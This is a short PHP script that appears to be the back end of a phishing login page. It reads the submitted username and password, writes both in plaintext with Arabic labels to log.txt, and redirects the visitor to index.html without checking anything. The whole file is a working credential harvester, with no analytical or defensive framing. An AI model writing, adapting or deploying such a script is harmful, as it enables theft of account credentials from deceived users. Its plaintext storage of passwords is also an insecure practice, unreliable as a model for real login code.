<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $logData = "اسم المستخدم: " . $username . "\n" . "كلمة السر: " . $password . "\n--------------------\n";

    file_put_contents("log.txt", $logData, FILE_APPEND | LOCK_EX);

    header("Location: index.html");
    exit();
}
?>


